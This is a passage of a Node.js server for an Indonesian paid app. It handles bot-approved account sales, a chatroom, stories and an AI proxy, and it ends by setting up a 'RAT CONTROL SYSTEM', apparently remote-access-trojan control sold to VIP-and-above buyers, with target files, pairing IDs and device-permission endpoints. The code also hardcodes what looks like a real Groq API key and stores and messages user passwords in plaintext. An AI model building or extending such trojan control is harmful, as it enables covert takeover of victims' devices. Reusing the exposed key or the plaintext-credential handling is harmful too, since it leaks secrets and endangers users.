      const availableSocks = Object.values(activeConnections);
      if (availableSocks.length > 0) {
        const waSock = availableSocks[Math.floor(Math.random() * availableSocks.length)];
        await waSock.sendMessage(waJid, {
          text:
            `🎉 *UPGRADE ROLE BERHASIL!*\n\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 Username: \`${upgradeReq.username}\`\n` +
            `📊 Role: ${oldRole} → *${upgradeReq.targetRole.toUpperCase()}*\n` +
            `━━━━━━━━━━━━━━━━━━━━\n\n` +
            `✅ Role lu udah di-upgrade!\n` +
            `Silakan login ulang / refresh app buat liat perubahan.\n\n` +
            `🆔 Request ID: \`${upgradeReq.id}\`\n` +
            `🙏 Terima kasih!`,
        });
        console.log(`[WA] Notif upgrade terkirim ke ${waTarget}`);
      }
    }
  } catch (e) {
    console.error('[WA] Gagal kirim notif:', e.message);
  }

  // Edit pesan di grup admin
 try {
  const upgradeHtml = `
<h2>🔄 Request Upgrade — APPROVED ✅</h2>
<table bordered striped>
  <tr><th>Field</th><th>Value</th></tr>
  <tr><td>🆔 ID</td><td><code>${upgradeReq.id}</code></td></tr>
  <tr><td>👤 User</td><td><code>${upgradeReq.username}</code></td></tr>
  <tr><td>📊 Role</td><td>${upgradeReq.currentRole} → <b>${upgradeReq.targetRole.toUpperCase()}</b></td></tr>
  <tr><td>💰 Harga</td><td>Rp ${upgradeReq.price.toLocaleString('id-ID')}</td></tr>
  <tr><td>💳 Metode</td><td>${upgradeReq.paymentMethod === 'qris' ? '📱 QRIS' : '🔵 DANA'}</td></tr>
</table>

<blockquote>
<b>📢 Status Pengiriman:</b><br/>
✅ Role user udah di-update di database<br/>
✅ Notif WS udah dikirim (kalo user online)<br/>
✅ Notif WA udah dikirim (kalo ada nomor)
</blockquote>

<p>✅ <i>Di-approve pada ${new Date(upgradeReq.approvedAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}</i></p>
`.trim();

  const edited = await editRichMessage(chatId, query.message.message_id, upgradeHtml);
  if (!edited) {
    await bot.editMessageCaption(
      `🔄 *UPGRADE APPROVED* ✅\n\n` +
      `👤 ${upgradeReq.username}\n` +
      `📊 ${upgradeReq.currentRole} → *${upgradeReq.targetRole.toUpperCase()}*\n` +
      `✅ ${new Date(upgradeReq.approvedAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: 'Markdown',
      }
    );
  }
} catch (e) {
  console.error('[EDIT MSG UPGRADE]', e.message);
}

  bot.answerCallbackQuery(query.id, {
    text: `✅ ${upgradeReq.username} berhasil di-upgrade ke ${upgradeReq.targetRole.toUpperCase()}!`,
    show_alert: true,
  });

  console.log(`[UPGRADE APPROVE] ${upgradeReq.username} → ${upgradeReq.targetRole}`);
  return;
}

  // ══════ HANDLE: UPGRADE REJECT ══════
  if (data.startsWith('upgrade_reject:')) {
    const requestId = data.split(':')[1];

    const requests = loadUpgradeRequests();
    const reqIdx = requests.findIndex(r => r.id === requestId);

    if (reqIdx === -1) {
      return bot.answerCallbackQuery(query.id, {
        text: '❌ Request ga ketemu.',
        show_alert: true,
      });
    }

    const upgradeReq = requests[reqIdx];
    if (upgradeReq.status !== 'pending') {
      return bot.answerCallbackQuery(query.id, {
        text: `⚠️ Request udah ${upgradeReq.status}.`,
        show_alert: true,
      });
    }

    upgradeReq.status = 'rejected';
    upgradeReq.approvedAt = new Date().toISOString();
    upgradeReq.approvedBy = `telegram_${fromId}`;
    requests[reqIdx] = upgradeReq;
    saveUpgradeRequests(requests);

    try {
  const rejectHtml = `
<h2>🔄 Request Upgrade — REJECTED ❌</h2>
<table bordered striped>
  <tr><th>Field</th><th>Value</th></tr>
  <tr><td>🆔 ID</td><td><code>${upgradeReq.id}</code></td></tr>
  <tr><td>👤 User</td><td><code>${upgradeReq.username}</code></td></tr>
  <tr><td>📊 Role</td><td>${upgradeReq.currentRole} → <b>${upgradeReq.targetRole.toUpperCase()}</b></td></tr>
</table>
<p>❌ <i>Di-reject pada ${new Date(upgradeReq.approvedAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}</i></p>
`.trim();

  const edited = await editRichMessage(chatId, query.message.message_id, rejectHtml);
  if (!edited) {
    await bot.editMessageCaption(
      `🔄 *UPGRADE REJECTED* ❌\n\n` +
      `👤 ${upgradeReq.username}\n` +
      `❌ ${new Date(upgradeReq.approvedAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: 'Markdown',
      }
    );
  }
} catch (e) {
  console.error('[EDIT MSG REJECT]', e.message);
}

    bot.answerCallbackQuery(query.id, {
      text: `❌ Request ${upgradeReq.username} ditolak.`,
      show_alert: true,
    });

    console.log(`[UPGRADE REJECT] ${upgradeReq.username}`);
    return;
  }
  
// ══════ HANDLE: BUY ACCESS — APPROVE ══════
if (data.startsWith('buy_approve:')) {
  const requestId = data.split(':')[1];
  const requests = loadBuyAccessRequests();
  const idx = requests.findIndex(r => r.id === requestId);

  if (idx === -1) {
    return bot.answerCallbackQuery(query.id, {
      text: '❌ Request ga ketemu.', show_alert: true,
    });
  }

  const req = requests[idx];
  if (req.status !== 'pending') {
    return bot.answerCallbackQuery(query.id, {
      text: `⚠️ Request udah ${req.status}.`, show_alert: true,
    });
  }

  const db = loadDatabase();

  // ── Tentukan username & password ──
  let newUsername = (req.username || '').trim();
  let newPassword = (req.password || '').trim();
  let usernameStatus = '';
  let passwordStatus = '';

  const isTaken = db.find(
    u => u.username.toLowerCase() === newUsername.toLowerCase()
  );

  if (!newUsername || newUsername.length < 3) {
    newUsername = generateUsername(req.role);
    usernameStatus = `⚠️ Username request gak valid. Auto-generate: ${newUsername}`;
  } else if (isTaken) {
    newUsername = generateUsername(req.role);
    usernameStatus = `⚠️ Username "${req.username}" udah dipake. Auto-generate: ${newUsername}`;
  } else {
    usernameStatus = `✅ Username sesuai request: ${newUsername}`;
  }

  if (!newPassword || newPassword.length < 3) {
    newPassword = generatePassword();
    passwordStatus = `⚠️ Password request gak valid. Auto-generate: ${newPassword}`;
  } else {
    passwordStatus = `✅ Password sesuai request pembeli`;
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + (req.durationDays || 30));

  // ── Simpen akun baru ──
  const newAccount = {
    username: newUsername,
    password: newPassword,
    role: req.role,
    expiredDate: expired.toISOString().split('T')[0],
    uid: crypto.randomBytes(16).toString('hex'),
    createdBy: 'buy_access',
    createdAt: new Date().toISOString(),
    pembeli: req.nama,
    whatsapp: req.whatsapp,
    telegram: req.telegram || null,
    paymentMethod: req.paymentMethod || 'qris',
  };
  db.push(newAccount);
  saveDatabase(db);

  // ── Update status request ──
  req.status = 'approved';
  req.approvedAt = new Date().toISOString();
  req.approvedBy = `telegram_${fromId}`;
  req.generatedUsername = newUsername;
  req.generatedPassword = newPassword;
  requests[idx] = req;
  saveBuyAccessRequests(requests);

  // ── Format pesan akun ──
  const expiredFormatted = expired.toLocaleDateString('id-ID', {
    day: '2-digit', month: 'long', year: 'numeric',
  });

  const accountMessage =
    `🎉 *AKUN LU UDAH JADI!*\n\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `🎯 *ROLE:* ${req.roleName}\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `👤 *Username:* \`${newUsername}\`\n` +
    `🔐 *Password:* \`${newPassword}\`\n` +
    `📅 *Expired:* ${expiredFormatted}\n` +
    `⏳ *Durasi:* ${req.durationDays || 30} hari\n` +
    `━━━━━━━━━━━━━━━━━━━━\n\n` +
    `⚠️ *JANGAN LUPA:*\n` +
    `• Login pake username & password di atas\n` +
    `• Simpan data ini, jangan sampe ilang\n` +
    `• Ada kendala? Chat admin ya\n\n` +
    `🆔 *Request ID:* \`${req.id}\`\n` +
    `🙏 Terima kasih udah beli!`;

  // ═══════════════════════════════════════════════════
  // 1) KIRIM KE WHATSAPP PEMBELI
  // ═══════════════════════════════════════════════════
  let waStatus = '❌ Gagal: ga ada sender aktif';
  let waSent = false;

  try {
    const waNumber = String(req.whatsapp).replace(/\D/g, '');
    let waTarget = waNumber;
    if (waTarget.startsWith('0')) {
      waTarget = '62' + waTarget.slice(1);
    }
    const waJid = waTarget + '@s.whatsapp.net';

    const availableSocks = Object.values(activeConnections);
    console.log(`[BUY ACCESS] Available WA senders: ${availableSocks.length}`);

    if (availableSocks.length > 0) {
      const waSock = availableSocks[Math.floor(Math.random() * availableSocks.length)];

      try {
        await waSock.sendMessage(waJid, { text: accountMessage });
        waSent = true;
        waStatus = `✅ Terkirim ke ${waTarget}`;
        console.log(`[BUY ACCESS] ✅ WA terkirim ke ${waTarget}`);
      } catch (sendErr) {
        waStatus = `❌ Gagal: ${sendErr.message}`;
        console.error(`[BUY ACCESS] ❌ WA gagal: ${sendErr.message}`);

        // Retry pake sender lain
        if (availableSocks.length > 1) {
          for (const retrySock of availableSocks.slice(1)) {
            try {
              await retrySock.sendMessage(waJid, { text: accountMessage });
              waSent = true;
              waStatus = `✅ Terkirim (retry) ke ${waTarget}`;
              console.log(`[BUY ACCESS] ✅ Retry WA berhasil ke ${waTarget}`);
              break;
            } catch (e) {
              console.error(`[BUY ACCESS] Retry WA gagal: ${e.message}`);
            }
          }
        }
      }
    } else {
      console.warn('[BUY ACCESS] ⚠️ GA ADA SENDER WA AKTIF!');
      waStatus = '❌ Gagal: ga ada sender WA aktif';
    }
  } catch (e) {
    waStatus = `❌ Error: ${e.message}`;
    console.error(`[BUY ACCESS] ❌ Error WA: ${e.message}`);
  }

  // ═══════════════════════════════════════════════════
  // 2) KIRIM KE TELEGRAM PEMBELI (AUTO-SEND)
  // ═══════════════════════════════════════════════════
  let tgStatus = '⏭️ Skip: ga ada username telegram';
  let tgSent = false;

  if (req.telegram && req.telegram.trim()) {
    const tgUsername = req.telegram.replace(/^@/, '').trim().toLowerCase();

    if (tgUsername) {
      try {
        const TG_USERS_FILE = path.join(__dirname, 'telegram_users.json');
        let tgUsers = {};
        if (fs.existsSync(TG_USERS_FILE)) {
          try {
            tgUsers = JSON.parse(fs.readFileSync(TG_USERS_FILE, 'utf8'));
          } catch { tgUsers = {}; }
        }

        const tgUser = tgUsers[tgUsername];
        console.log(`[BUY ACCESS] Cari TG user: @${tgUsername} → ${tgUser ? 'FOUND' : 'NOT FOUND'}`);

        if (tgUser && tgUser.chatId) {
          try {
            await bot.sendMessage(tgUser.chatId, accountMessage, {
              parse_mode: 'Markdown',
            });
            tgSent = true;
            tgStatus = `✅ Terkirim ke @${tgUsername}`;
            console.log(`[BUY ACCESS] ✅ Telegram terkirim ke @${tgUsername} (chatId: ${tgUser.chatId})`);
          } catch (sendErr) {
            tgStatus = `❌ Gagal kirim: ${sendErr.message}`;
            console.error(`[BUY ACCESS] ❌ Telegram gagal: ${sendErr.message}`);
          }
        } else {
          tgStatus = `⚠️ User @${tgUsername} belum pernah /start bot ini`;
          console.warn(`[BUY ACCESS] ⚠️ User @${tgUsername} belum /start bot`);
        }
      } catch (e) {
        tgStatus = `❌ Error: ${e.message}`;
        console.error(`[BUY ACCESS] ❌ Error TG: ${e.message}`);
      }
    }
  }

  // ═══════════════════════════════════════════════════
  // 3) KIRIM NOTIF KE ADMIN — biar tau status pengiriman
  // ═══════════════════════════════════════════════════
 try {
  const buyHtml = `
<h2>✅ Pembelian Di-Approve</h2>
<table bordered striped>
  <tr><th>Field</th><th>Value</th></tr>
  <tr><td>🆔 ID</td><td><code>${req.id}</code></td></tr>
  <tr><td>👤 Nama</td><td><code>${req.nama}</code></td></tr>
  <tr><td>📱 WhatsApp</td><td><code>${req.whatsapp}</code></td></tr>
  ${req.telegram ? `<tr><td>✈️ Telegram</td><td><code>${req.telegram}</code></td></tr>` : ''}
  <tr><td>🎖️ Role</td><td><b>${req.roleName}</b></td></tr>
  <tr><td>💳 Metode</td><td>${req.paymentMethod === 'qris' ? '📱 QRIS' : '🔵 DANA'}</td></tr>
</table>

<h3>🔐 Akun Yang Dibuat</h3>
<table bordered striped>
  <tr><th>Field</th><th>Value</th></tr>
  <tr><td>👤 Username</td><td><code>${newUsername}</code></td></tr>
  <tr><td>🔑 Password</td><td><code>${newPassword}</code></td></tr>
  <tr><td>📅 Expired</td><td><code>${expired.toISOString().split('T')[0]}</code></td></tr>
</table>

<blockquote>
<b>📢 Status Pengiriman:</b><br/>
📱 WA: ${waStatus}<br/>
✈️ TG: ${tgStatus}
</blockquote>

${!tgSent && req.telegram ? `<p>⚠️ <i>Kalo TG gagal, minta user /start bot ini dulu</i></p>` : ''}
${!waSent ? `<p>⚠️ <i>Kalo WA gagal, cek sender aktif pake /senderinfo</i></p>` : ''}
`.trim();

  const edited = await editRichMessage(chatId, query.message.message_id, buyHtml);
  if (!edited) {
    await bot.editMessageCaption(
      `✅ *PEMBELIAN DI-APPROVE*\n\n` +
      `👤 ${req.nama}\n` +
      `🎖️ ${req.roleName}\n` +
      `👤 User: \`${newUsername}\`\n` +
      `📱 WA: ${waStatus}\n` +
      `✈️ TG: ${tgStatus}`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: 'Markdown',
      }
    );
  }
} catch (e) {
  console.error('[EDIT MSG BUY]', e.message);
}

  // ═══════════════════════════════════════════════════
  // 4) CONFIRM CALLBACK
  // ═══════════════════════════════════════════════════
  const statusText = [];
  if (waSent) statusText.push('✅ WA');
  else statusText.push('❌ WA');
  if (tgSent) statusText.push('✅ TG');
  else if (req.telegram) statusText.push('⚠️ TG (belum /start)');

  bot.answerCallbackQuery(query.id, {
    text: `Akun dibuat! ${statusText.join(' | ')}`,
    show_alert: true,
  });

  console.log(`[BUY APPROVE] ${newUsername} (${req.roleName}) → ${req.nama} | WA: ${waSent} | TG: ${tgSent}`);
  return;
}


  // Callback ga dikenali
  bot.answerCallbackQuery(query.id, {
    text: '⚠️ Aksi tidak dikenal.',
  });
});

console.log('[CALLBACK] Handler tombol konfirmasi terpasang.');

// ══════════════════════════════════════════════════════════════
// ══════ GLOBAL CHATROOM API (TEXT + IMAGE + VIDEO) ══════
// ══════════════════════════════════════════════════════════════
const CHATROOM_FILE = path.join(__dirname, 'chatroom.json');
const CHAT_UPLOAD_DIR = path.join(__dirname, 'uploads', 'chat');

if (!fs.existsSync(CHAT_UPLOAD_DIR)) {
  fs.mkdirSync(CHAT_UPLOAD_DIR, { recursive: true });
  console.log('[CHATROOM] Folder uploads/chat dibuat.');
}

function loadChatRoom() {
  try {
    if (!fs.existsSync(CHATROOM_FILE)) return [];
    return JSON.parse(fs.readFileSync(CHATROOM_FILE, 'utf8'));
  } catch { return []; }
}

function saveChatRoom(data) {
  fs.writeFileSync(CHATROOM_FILE, JSON.stringify(data, null, 2));
}

// ── GET /chatroom — Ambil semua pesan ──
app.get("/chatroom", (req, res) => {
  try {
    const chats = loadChatRoom();
    const normalized = chats.map(c => ({
      from: c.from,
      message: c.message,
      type: c.type || 'text',
      time: c.time,
      status: c.status || 'terkirim',
    }));
    res.json(normalized);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ── POST /chatroom — Kirim pesan baru ──
app.post("/chatroom", (req, res) => {
  const { from, message, type } = req.body;

  if (!from || !message) {
    return res.status(400).json({ error: "from dan message wajib diisi" });
  }

  try {
    const msgType = (type || 'text').toLowerCase();
    if (!['text', 'image', 'video'].includes(msgType)) {
      return res.status(400).json({ error: "type harus text, image, atau video" });
    }
    if (msgType !== 'text' && !message.startsWith('http')) {
      return res.status(400).json({ error: "Media harus berupa URL yang valid" });
    }

    const chats = loadChatRoom();
    const newChat = {
      from: from,
      message: message,
      type: msgType,
      time: Date.now(),
      status: "terkirim"
    };

    chats.push(newChat);
    if (chats.length > 500) chats.shift();

    saveChatRoom(chats);
    res.json({ success: true, chat: newChat });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ── POST /chatroom/upload — Upload foto/video ──
app.post("/chatroom/upload", async (req, res) => {
  try {
    const parts = await parseMultipart(req);

    let fileBuffer = null;
    let fileExt = '.jpg';

    for (const part of parts) {
      if (part.name === 'file' && part.filename) {
        fileExt = (path.extname(part.filename) || '.jpg').toLowerCase();
        fileBuffer = part.data;
      }
    }

    if (!fileBuffer || fileBuffer.length === 0) {
      return res.status(400).json({ valid: false, error: 'File wajib diupload' });
    }

    if (fileBuffer.length > 50 * 1024 * 1024) {
      return res.status(400).json({ valid: false, error: 'Max 50MB' });
    }

    const allowedExts = [
      '.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp',
      '.mp4', '.mov', '.webm', '.mkv', '.avi'
    ];
    if (!allowedExts.includes(fileExt)) {
      return res.status(400).json({
        valid: false,
        error: `Format tidak didukung. Pakai: ${allowedExts.join(', ')}`
      });
    }

    const randomName = `chat_${Date.now()}_${Math.random().toString(36).slice(2, 8)}${fileExt}`;
    const filePath = path.join(CHAT_UPLOAD_DIR, randomName);
    fs.writeFileSync(filePath, fileBuffer);

    const isVideo = ['.mp4', '.mov', '.webm', '.mkv', '.avi'].includes(fileExt);
    const type = isVideo ? 'video' : 'image';

    const fileUrl = `${req.protocol}://${req.get('host')}/uploads/chat/${randomName}`;

    console.log(`[CHAT UPLOAD] ${randomName} (${type}) — ${(fileBuffer.length / 1024).toFixed(1)} KB`);

    res.json({
      valid: true,
      url: fileUrl,
      type: type,
      filename: randomName,
      size: fileBuffer.length,
    });
  } catch (err) {
    console.error('[CHAT UPLOAD ERROR]', err);
    res.status(500).json({ valid: false, error: err.message });
  }
});

// ── GET /getUserRole ──
app.get("/getUserRole", (req, res) => {
  const { username } = req.query;
  if (!username) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === username);

  if (user) {
    res.json({ valid: true, role: user.role || 'member' });
  } else {
    res.json({ valid: false });
  }
});

console.log('[CHATROOM] Endpoint terpasang: /chatroom, /chatroom/upload, /getUserRole');

// ══════════════════════════════════════════════════════════════
// ══════ STORY SYSTEM (ala Instagram) ══════
// ══════════════════════════════════════════════════════════════
const STORY_FILE = path.join(__dirname, 'stories.json');
const STORY_UPLOAD_DIR = path.join(__dirname, 'uploads', 'stories');

if (!fs.existsSync(STORY_UPLOAD_DIR)) {
  fs.mkdirSync(STORY_UPLOAD_DIR, { recursive: true });
  console.log('[STORY] Folder uploads/stories dibuat.');
}

// Story expired 24 jam
const STORY_TTL = 24 * 60 * 60 * 1000;

function loadStories() {
  try {
    if (!fs.existsSync(STORY_FILE)) return [];
    return JSON.parse(fs.readFileSync(STORY_FILE, 'utf8'));
  } catch { return []; }
}

function saveStories(data) {
  fs.writeFileSync(STORY_FILE, JSON.stringify(data, null, 2));
}

// Bersihin story lama (> 24 jam) + hapus file-nya
function cleanupStories() {
  const now = Date.now();
  const stories = loadStories();
  const fresh = [];
  let deleted = 0;

  for (const s of stories) {
    if (now - s.createdAt > STORY_TTL) {
      // Hapus file media
      if (s.mediaUrl) {
        try {
          const filename = s.mediaUrl.split('/').pop();
          const filePath = path.join(STORY_UPLOAD_DIR, filename);
          if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
        } catch (_) {}
      }
      deleted++;
    } else {
      fresh.push(s);
    }
  }

  if (deleted > 0) {
    saveStories(fresh);
    console.log(`[STORY CLEANUP] ${deleted} story expired dihapus.`);
  }
}

// Auto cleanup tiap 1 jam
setInterval(cleanupStories, 60 * 60 * 1000);

// ── GET /story/list ──
// Return: list semua story aktif, dikelompokkan per user
// Query: ?key=SESSION_KEY
app.get("/story/list", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Session invalid" });

  try {
    cleanupStories();
    const stories = loadStories();
    const now = Date.now();

    // Group by username
    const grouped = {};
    stories.forEach(s => {
      if (now - s.createdAt > STORY_TTL) return;
      if (!grouped[s.username]) {
        grouped[s.username] = {
          username: s.username,
          avatar: s.avatar || null,
          role: s.role || 'member',
          stories: [],
          latestTime: 0,
          hasUnseen: false,
        };
      }
      grouped[s.username].stories.push(s);
      if (s.createdAt > grouped[s.username].latestTime) {
        grouped[s.username].latestTime = s.createdAt;
      }
      // Cek unseen (belum dilihat oleh user ini)
      if (!(s.viewedBy || []).includes(keyInfo.username)) {
        grouped[s.username].hasUnseen = true;
      }
    });

    // Convert to array, sort by latest
    const list = Object.values(grouped).map(g => ({
      ...g,
      stories: g.stories.sort((a, b) => a.createdAt - b.createdAt),
    })).sort((a, b) => b.latestTime - a.latestTime);

    res.json({ valid: true, stories: list });
  } catch (e) {
    console.error("[STORY LIST]", e);
    res.status(500).json({ valid: false, error: e.message });
  }
});

// ── GET /story/user/:username ──
// Detail story 1 user (buat viewer)
app.get("/story/user/:username", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  try {
    cleanupStories();
    const { username } = req.params;
    const stories = loadStories()
      .filter(s => s.username === username && Date.now() - s.createdAt < STORY_TTL)
      .sort((a, b) => a.createdAt - b.createdAt);

    res.json({ valid: true, stories });
  } catch (e) {
    res.status(500).json({ valid: false, error: e.message });
  }
});

// ── POST /story/create ──
// Body: { key, type: "text"|"image"|"video", text?, mediaUrl?, bgColor?, textColor? }
app.post("/story/create", (req, res) => {
  const { key, type, text, mediaUrl, bgColor, textColor } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  try {
    if (!['text', 'image', 'video'].includes(type)) {
      return res.status(400).json({ valid: false, error: "type invalid" });
    }
    if (type === 'text' && (!text || text.trim().length === 0)) {
      return res.status(400).json({ valid: false, error: "Text wajib diisi" });
    }
    if (type !== 'text' && (!mediaUrl || !mediaUrl.startsWith('http'))) {
      return res.status(400).json({ valid: false, error: "Media URL invalid" });
    }
    if (text && text.length > 300) {
      return res.status(400).json({ valid: false, error: "Text max 300 karakter" });
    }

    // Ambil role user dari database
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    const userRole = user ? (user.role || 'member') : 'member';

    const stories = loadStories();
    const story = {
      id: 'STY-' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2, 5).toUpperCase(),
      username: keyInfo.username,
      role: userRole,
      type,
      text: text || null,
      mediaUrl: mediaUrl || null,
      bgColor: bgColor || '#0D0722',
      textColor: textColor || '#FFFFFF',
      createdAt: Date.now(),
      viewedBy: [],
    };

    stories.push(story);
    saveStories(stories);

    console.log(`[STORY] ${keyInfo.username} bikin story (${type})`);
    res.json({ valid: true, story });
  } catch (e) {
    console.error("[STORY CREATE]", e);
    res.status(500).json({ valid: false, error: e.message });
  }
});

// ── POST /story/upload ──
// Upload media (foto/video) buat story
app.post("/story/upload", async (req, res) => {
  try {
    const parts = await parseMultipart(req);

    let fileBuffer = null;
    let fileExt = '.jpg';

    for (const part of parts) {
      if (part.name === 'file' && part.filename) {
        fileExt = (path.extname(part.filename) || '.jpg').toLowerCase();
        fileBuffer = part.data;
      }
    }

    if (!fileBuffer || fileBuffer.length === 0) {
      return res.status(400).json({ valid: false, error: 'File wajib diupload' });
    }
    if (fileBuffer.length > 50 * 1024 * 1024) {
      return res.status(400).json({ valid: false, error: 'Max 50MB' });
    }

    const allowedExts = [
      '.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp',
      '.mp4', '.mov', '.webm', '.mkv', '.avi'
    ];
    if (!allowedExts.includes(fileExt)) {
      return res.status(400).json({ valid: false, error: 'Format tidak didukung' });
    }

    const randomName = `story_${Date.now()}_${Math.random().toString(36).slice(2, 8)}${fileExt}`;
    const filePath = path.join(STORY_UPLOAD_DIR, randomName);
    fs.writeFileSync(filePath, fileBuffer);

    const isVideo = ['.mp4', '.mov', '.webm', '.mkv', '.avi'].includes(fileExt);
    const url = `${req.protocol}://${req.get('host')}/uploads/stories/${randomName}`;

    console.log(`[STORY UPLOAD] ${randomName} (${(fileBuffer.length / 1024).toFixed(1)} KB)`);
    res.json({ valid: true, url, type: isVideo ? 'video' : 'image' });
  } catch (err) {
    console.error('[STORY UPLOAD]', err);
    res.status(500).json({ valid: false, error: err.message });
  }
});

// ── POST /story/view ──
// Tandai story udah dilihat
app.post("/story/view", (req, res) => {
  const { key, storyId } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  try {
    const stories = loadStories();
    const idx = stories.findIndex(s => s.id === storyId);
    if (idx === -1) return res.status(404).json({ valid: false });

    if (!stories[idx].viewedBy) stories[idx].viewedBy = [];
    if (!stories[idx].viewedBy.includes(keyInfo.username)) {
      stories[idx].viewedBy.push(keyInfo.username);
      saveStories(stories);
    }
    res.json({ valid: true });
  } catch (e) {
    res.status(500).json({ valid: false, error: e.message });
  }
});

// ── DELETE /story/:id ──
app.delete("/story/:id", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  try {
    const stories = loadStories();
    const idx = stories.findIndex(s => s.id === req.params.id);
    if (idx === -1) return res.status(404).json({ valid: false });

    // Cuma boleh hapus story sendiri
    if (stories[idx].username !== keyInfo.username) {
      return res.status(403).json({ valid: false, error: "Bukan story lu" });
    }

    // Hapus file media
    if (stories[idx].mediaUrl) {
      try {
        const filename = stories[idx].mediaUrl.split('/').pop();
        const filePath = path.join(STORY_UPLOAD_DIR, filename);
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
      } catch (_) {}
    }

    stories.splice(idx, 1);
    saveStories(stories);
    res.json({ valid: true });
  } catch (e) {
    res.status(500).json({ valid: false, error: e.message });
  }
});

console.log('[STORY] Endpoint terpasang: /story/list, /story/user/:username, /story/create, /story/upload, /story/view, /story/:id');

// ══════════════════════════════════════════════════════════════
// ══════ AI PROXY (BUAT NEXØ AI) ══════
// ══════════════════════════════════════════════════════════════
app.post('/ai/chat', async (req, res) => {
  const { messages, systemPrompt } = req.body;

  if (!messages || !Array.isArray(messages)) {
    return res.status(400).json({ valid: false, message: 'Messages required' });
  }

  // ── Coba API 1: Pollinations ──
  try {
    const r = await axios.post('https://text.pollinations.ai/openai', {
      model: 'openai-large',
      messages: [
        { role: 'system', content: systemPrompt || 'Kamu adalah NEXØ AI, asisten cerdas dan gaul.' },
        ...messages,
      ],
      temperature: 0.8,
    }, { timeout: 30000 });

    if (r.data?.choices?.[0]?.message?.content) {
      return res.json({
        valid: true,
        response: r.data.choices[0].message.content.trim(),
      });
    }
  } catch (e) {
    console.log('[AI] Pollinations gagal, coba Groq...');
  }

  // ── Coba API 2: Groq ──
  try {
    const r = await axios.post('https://api.groq.com/openai/v1/chat/completions', {
      model: 'llama3-8b-8192',
      messages: [
        { role: 'system', content: systemPrompt || 'Kamu adalah NEXØ AI, asisten cerdas dan gaul.' },
        ...messages,
      ],
      max_tokens: 1000,
      temperature: 0.8,
    }, {
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer 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', // Ganti dengan API key Groq lu
      },
      timeout: 20000,
    });

    if (r.data?.choices?.[0]?.message?.content) {
      return res.json({
        valid: true,
        response: r.data.choices[0].message.content.trim(),
      });
    }
  } catch (e) {
    console.log('[AI] Groq gagal, coba fallback...');
  }

  // ── Fallback terakhir ──
  res.json({
    valid: false,
    response: 'Hmm koneksi lagi agak lemot nih 😅 Coba ulangi ya!',
  });
});

console.log('[AI] Endpoint terpasang: POST /ai/chat');


// ══════ CALL SERVER (WebRTC Signaling + Chat Pribadi) ══════
const { mountCallServer } = require('./call_server');
mountCallServer({ app, io, activeKeys, loadDatabase });
console.log('[CALL] WebRTC Signaling + Chat Pribadi terpasang ✅');

// ════════════════════════════════════════════════════════════════════════════
// ██████████  RAT CONTROL SYSTEM  ██████████████████████████████████████████
// ════════════════════════════════════════════════════════════════════════════

const RAT_TARGETS = './rat_targets.json';
const RAT_LIVE    = {};
const RAT_ALLOWED = ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip'];

function readRat(f) {
  try { return JSON.parse(fs.existsSync(f) ? fs.readFileSync(f,'utf8')||'[]' : '[]'); } catch { return []; }
}
function saveRat(f,d) { try { fs.writeFileSync(f, JSON.stringify(d,null,2)); } catch(_) {} }
function genPairId() { return crypto.randomBytes(8).toString('hex').toUpperCase(); }

// ══════════════════════════════════════════════════════════════
// ══════ HELPER: Ambil user object dari session key ══════
// ══════ Dipake sama ratGuard (butuh full object, bukan cuma username) ══════
// ══════════════════════════════════════════════════════════════
function getUserObjectByKey(key) {
  if (!key) return null;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return null;
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user || null;
}

// ── Role Guard: blok member ─────────────────────────────────────────────────
function ratGuard(req, res, next) {
  const key = req.query.key || req.body?.key;
  const user = getUserObjectByKey(key);
  if (!user) return res.json({ valid: false, message: 'Invalid key' });
  const role = (user.role || '').toLowerCase();
  if (!RAT_ALLOWED.includes(role)) return res.json({ valid: false, message: 'Akses ditolak. Fitur RAT hanya untuk role vip ke atas' });
  req._ratUser = user;
  next();
}

// ── Startup: generate pairId untuk semua user yang belum punya ──────────────
(function generateAllPairIds() {
  try {
    const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
    let changed = false;
    for (let i = 0; i < db.length; i++) {
      if (!db[i].pairId) { db[i].pairId = genPairId(); changed = true; console.log(`[RAT-STARTUP] pairId generated: ${db[i].username} → ${db[i].pairId}`); }
    }
    if (changed) fs.writeFileSync('./database.json', JSON.stringify(db,null,2));
    else console.log('[RAT-STARTUP] All users already have pairId');
  } catch(e) { console.error('[RAT-STARTUP] Error:', e.message); }
})();

// ── Device Permission Endpoints ─────────────────────────────────────────────
app.get('/devicePerms', ratGuard, (req, res) => {
  const { username } = req.query;
